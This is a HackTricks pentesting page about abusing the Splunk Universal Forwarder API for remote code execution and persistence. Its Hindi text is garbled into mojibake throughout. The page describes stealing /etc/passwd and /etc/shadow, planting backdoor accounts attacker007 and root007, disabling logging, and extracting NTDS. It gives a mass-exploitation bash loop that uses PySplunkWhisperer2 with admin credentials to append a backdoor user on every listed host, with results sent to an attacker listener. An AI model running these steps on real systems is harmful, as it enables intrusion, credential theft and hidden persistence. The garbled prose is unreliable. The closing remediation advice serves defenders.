<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>


рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдорд╢реАрди рдХреЛ **рдЖрдВрддрд░рд┐рдХ** рдпрд╛ **рдмрд╛рд╣рд░реА рд░реВрдк рд╕реЗ рдЬрд╛рдБрдЪрддреЗ** рд╣реБрдП **Splunk рдЪрд▓ рд░рд╣рд╛** рдкрд╛рддреЗ рд╣реИрдВ (рдкреЛрд░реНрдЯ 8090), рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рднрд╛рдЧреНрдп рд╕реЗ рдХреЛрдИ **рд╡реИрдз рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓** рд╣реИрдВ, рддреЛ рдЖрдк **Splunk рд╕реЗрд╡рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдХреЗ Splunk рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╢реИрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд░реВрдЯ рдЗрд╕реЗ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЛ рд░реВрдЯ рддрдХ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд░реВрдЯ рд╣реИрдВ рдФрд░ Splunk рд╕реЗрд╡рд╛ рдХреЗрд╡рд▓ localhost рдкрд░ рд╕реБрди рд░рд╣реА рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк Splunk рд╕реЗрд╡рд╛ рд╕реЗ **рдкрд╛рд╕рд╡рд░реНрдб** рдлрд╝рд╛рдЗрд▓ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ **рдХреНрд░реИрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рдЙрд╕рдореЗрдВ **рдирдП** рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рд╕реНрдерд┐рд░рддрд╛ рдмрдирд╛рдП рд░рдЦреЗрдВред

рдкрд╣рд▓реА рдЫрд╡рд┐ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ Splunkd рд╡реЗрдм рдкреЗрдЬ рдХреИрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИред

**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) **рд╕реЗ рдХреЙрдкреА рдХреА рдЧрдИ рд╣реИ**

# рд╢реИрд▓ рдФрд░ рд╕реНрдерд┐рд░рддрд╛ рдХреЗ рд▓рд┐рдП Splunk рдлрд╝реЙрд░рд╡рд░реНрдбрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

14 рдЕрдЧрд╕реНрдд 2020

## рд╡рд┐рд╡рд░рдг: <a href="#description" id="description"></a>

Splunk Universal Forwarder рдПрдЬреЗрдВрдЯ (UF) рдЕрдзрд┐рдХреГрдд рджреВрд░рд╕реНрде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ Splunk API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХрд▓ рдЖрджреЗрд╢ рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред UF рдПрдЬреЗрдВрдЯ рдЖрдиреЗ рд╡рд╛рд▓реА рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рдкреБрд╖реНрдЯрд┐ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╡реЗ рдПрдХ рд╡реИрдз Splunk Enterprise рд╕рд░реНрд╡рд░ рд╕реЗ рдЖ рд░рд╣реА рд╣реИрдВ, рдФрд░ рди рд╣реА UF рдПрдЬреЗрдВрдЯ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреЛрдб рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдЕрдиреНрдпрдерд╛ Splunk Enterprise рд╕рд░реНрд╡рд░ рд╕реЗ рд╣реЛрдиреЗ рдХреА рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░, рдЬреЛ UF рдПрдЬреЗрдВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЕрдирд┐рдпрдорд┐рдд рдХреЛрдб рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ, рдпрд╛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВред

рдпрд╣ рд╣рдорд▓рд╛ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рджреБрд╖реНрдЯ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЬрдВрдЧрд▓реА рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрддрд┐ рд╕реИрдХрдбрд╝реЛрдВ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреА рд╣реИред

Splunk UF рдкрд╛рд╕рд╡рд░реНрдб рдЕрдкреНрд░рд╛рдп рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рд╕реЗрдХреНрд╢рди Common Password Locations рджреЗрдЦреЗрдВред

## рд╕рдВрджрд░реНрдн: <a href="#context" id="context"></a>

Splunk рдПрдХ рдбреЗрдЯрд╛ рд╕рдВрдЪрдпрди рдФрд░ рдЦреЛрдЬ рдЙрдкрдХрд░рдг рд╣реИ рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реВрдЪрдирд╛ рдФрд░ рдШрдЯрдирд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ (SIEM) рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдп
## рдкреНрд░рднрд╛рд╡: <a href="#impact" id="impact"></a>

рдПрдХ Splunk Universal Forward Agent рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рднреА Splunk рд╣реЛрд╕реНрдЯ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдкрд░ рд╕рд┐рд╕реНрдЯрдо рдпрд╛ рд░реВрдЯ рд╕реНрддрд░ рдХреА рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдореИрдВрдиреЗ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ Splunk рдПрдЬреЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ Windows, Linux рдФрд░ Solaris Unix рд╣реЛрд╕реНрдЯ рдкрд░ рдХрд┐рдпрд╛ рд╣реИред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ, рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдпрд╛ рд░реИрдВрд╕рдорд╡реЗрдпрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ рддреЗрдЬ, рдЙрдкрдпреЛрдЧ рдореЗрдВ рдЖрд╕рд╛рди рдФрд░ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╣реИред

Splunk рд▓реЙрдЧ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкрд╣рд▓реЗ рдХрдорд╛рдВрдб рд░рди рдХрд░рдиреЗ рдкрд░ Universal Forwarder рд╕реНрдерд╛рди рдХреЛ рдмрджрд▓рдиреЗ, Splunk SIEM рдореЗрдВ рд▓реЙрдЧрд┐рдВрдЧ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЗрд╕рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдмреНрд▓реВ рдЯреАрдо рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝реЗ рдЬрд╛рдиреЗ рдХреЗ рдЕрд╡рд╕рд░ рдХреЛ рдмрд╣реБрдд рдХрдо рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

Splunk Universal Forwarder рдХреЛ рдЕрдХреНрд╕рд░ рд▓реЙрдЧ рд╕рдВрдЧреНрд░рд╣ рдХреЗ рд▓рд┐рдП рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ NTDS рдлрд╝рд╛рдЗрд▓ рдирд┐рдХрд╛рд▓рдиреЗ, рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░/рдпрд╛ рдбреЛрдореЗрди рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред

рдЕрдВрдд рдореЗрдВ, Universal Forwarding рдПрдЬреЗрдВрдЯ рдХреЛ рд▓рд╛рдЗрд╕реЗрдВрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рдФрд░ рдЗрд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдЯреИрдВрдб рдЕрд▓реЛрди рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ Universal Forwarder рдХреЛ рд╣реЛрд╕реНрдЯ рдкрд░ рдмреИрдХрдбреЛрд░ рд╕реНрдерд╛рдпрд┐рддреНрд╡ рддрдВрддреНрд░ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рд╡реИрдз рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реИ рдЬрд┐рд╕реЗ рдЧреНрд░рд╛рд╣рдХ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╡реЗ рдЬреЛ Splunk рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдирд╣реАрдВ рд╣реИред

## рд╕рдмреВрдд: <a href="#evidence" id="evidence"></a>

рдПрдХ рд╢реЛрдз рдкрд░реНрдпрд╛рд╡рд░рдг рд╕реЗрдЯрдЕрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореИрдВрдиреЗ рдирд╡реАрдирддрдо Splunk рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрджрд╛рд╣рд░рдг рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рд╣реИред рдЗрд╕ рд░рд┐рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рдХреБрд▓ 10 рдЫрд╡рд┐рдпрд╛рдВ рдЕрдЯреИрдЪ рдХреА рдЧрдИ рд╣реИрдВ, рдЬреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рджрд┐рдЦрд╛рддреА рд╣реИрдВ:

1- PySplunkWhisper2 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ /etc/passwd рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- Netcat рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рд╕рд┐рд╕реНрдЯрдо рдкрд░ /etc/passwd рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- PySplunkWhisper2 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ /etc/shadow рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- Netcat рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рд╕рд┐рд╕реНрдЯрдо рдкрд░ /etc/shadow рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- /etc/passwd рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ attacker007 рдХреЛ рдЬреЛрдбрд╝рдирд╛

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- /etc/shadow рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ attacker007 рдХреЛ рдЬреЛрдбрд╝рдирд╛

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- рдирдИ /etc/shadow рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЬрд┐рд╕рдореЗрдВ attacker007 рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИ

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- attacker007 рдЦрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреАрдбреАрдПрд╕рдПрд╕ рдПрдХреНрд╕реЗрд╕ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдирд╛

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ root007 рдХреЗ рд╕рд╛рде рдмреИрдХрдбреЛрд░ рд░реВрдЯ рдЦрд╛рддрд╛ рдЬреЛрдбрд╝рдирд╛, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдпреВрдЖрдИрдбреА/рдЬреАрдЖрдИрдбреА 0 рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- attacker007 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреАрдбреАрдПрд╕рдПрд╕ рдПрдХреНрд╕реЗрд╕ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдирд╛, рдФрд░ рдлрд┐рд░ root007 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░реВрдЯ рдХреА рдУрд░ рдЙрдиреНрдирдпрди рдХрд░рдирд╛

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

рдЗрд╕ рд╕рдордп рдореЗрд░реЗ рдкрд╛рд╕ Splunk рдФрд░ рджреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреЗ рдкреНрд░рддрд┐рд╖реНрдард╛рдирд┐рдХ рдПрдХреНрд╕реЗрд╕ рд╣реИ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдПрдХ рд░реВрдЯ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдореИрдВ рдЕрдкрдиреЗ рдЯреНрд░реИрдХ рдХреЛ рдХрд╡рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд░рд╕реНрде рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ рдФрд░ рдЗрд╕ рд╣реЛрд╕реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рд╣рдорд▓рд╛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддрд╛ рд╣реВрдБред

PySplunkWhisperer2 рдХреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рдФрд░ рдкреНрд░рднрд╛рд╡реА рд╣реИред

1. рдЙрди рд╣реЛрд╕реНрдЯреЛрдВ рдХреЗ рдЖрдИрдкреА рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдирд╛рдо ip.txt
2. рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдПрдБ:
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
## рдЕрднрд┐рдирд┐рд╡реЗрд╢рди рд╕реВрдЪрдирд╛ рдХреЗ рд▓рд┐рдП рд╕реБрдЭрд╛рд╡: Splunk, Inc рдХреЗ рд▓рд┐рдП <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

рдореИрдВ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдорд╛рдзрд╛рдиреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреЗрддрд╛ рд╣реВрдБ:

1. рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рдлрд╝реЙрд░рд╡рд░реНрдбрд░ рдПрдЬреЗрдВрдЯ рдХреЗ рдкрд╛рд╕ рдХреЛрдИ рдЦреБрд▓рд╛ рдкреЛрд░реНрдЯ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдмрд▓реНрдХрд┐ рдпрд╣ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ рд╕реНрдкреНрд▓рдВрдХ рд╕рд░реНрд╡рд░ рд╕реЗ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рд▓рд┐рдП рдкреЛрд▓ рдХрд░реЗрдЧрд╛ред
2. рдЧреНрд░рд╛рд╣рдХреЛрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдЯреАрдПрд▓рдПрд╕ рд╕рд╣-рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ, рдкреНрд░рддреНрдпреЗрдХ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рд▓рд┐рдП рд╡реНрдпрдХреНрддрд┐рдЧрдд рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдпрд╣ рд╕реНрдкреНрд▓рдВрдХ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдмреАрдЪ рдмрд╣реБрдд рдЙрдЪреНрдЪ рджреНрд╡рд┐рджрд┐рд╢реАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ред рдЯреАрдПрд▓рдПрд╕ рд╕рд╣-рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдПрдЬреЗрдВрдЯреЛрдВ рдФрд░ рдЖрдИрдУрдЯреА рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рдЧрд╣рдирддрд╛рдкреВрд░реНрд╡рдХ рд▓рд╛рдЧреВ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рдпрд╣ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдкреНрд░рд╛рдкреНрдд рдЙрдкрдХрд░рдг рдЧреНрд░рд╛рд╣рдХ рд╕рд░реНрд╡рд░ рд╕рдВрдЪрд╛рд░ рдХрд╛ рднрд╡рд┐рд╖реНрдп рд╣реИред
3. рд╕рднреА рдХреЛрдб, рдПрдХрд▓ рдкрдВрдХреНрддрд┐ рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ, рдПрдХ рд╕рдВрдкреАрдбрд╝рд┐рдд рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рднреЗрдЬреЗрдВ рдЬрд┐рд╕реЗ рд╕реНрдкреНрд▓рдВрдХ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдФрд░ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдЬреЗрдВрдЯ рдбреЗрдЯрд╛ рдХреЛ рдПрдкреАрдЖрдИ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрдиреЗ рд╕реЗ рдмрдЪрд╛рдПрдЧрд╛, рд▓реЗрдХрд┐рди рддреАрд╕рд░реЗ рдкрдХреНрд╖ рд╕реЗ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ред

